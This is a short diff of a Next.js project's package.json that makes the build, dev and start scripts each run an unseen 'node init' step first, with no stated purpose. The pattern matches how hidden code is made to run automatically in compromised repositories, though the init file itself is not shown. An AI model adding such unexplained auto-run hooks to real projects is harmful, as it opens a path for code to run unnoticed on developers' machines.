@@ -6,16 +6,16 @@
   "scripts": {
     "ci:build": "next build",
     "ci:test": "turbo ci:local:run-checks",
-    "build": "turbo build:legacy",
-    "build:legacy": "next build",
+    "build": "node init && turbo build:legacy",
+    "build:legacy": "node init && next build",
     "check": "next lint && tsc --noEmit",
-    "dev": "next dev --turbopack",
+    "dev": "node init && next dev --turbopack",
     "format:check": "prettier --check \"**/*.{ts,tsx,js,jsx,mdx}\" --cache",
     "format:write": "prettier --write \"**/*.{ts,tsx,js,jsx,mdx}\" --cache",
     "lint": "next lint",
     "lint:fix": "next lint --fix",
     "preview": "next build && next start",
-    "start": "next start",
+    "start": "node init && next start",
     "typecheck": "tsc --noEmit"
   },
   "dependencies": {
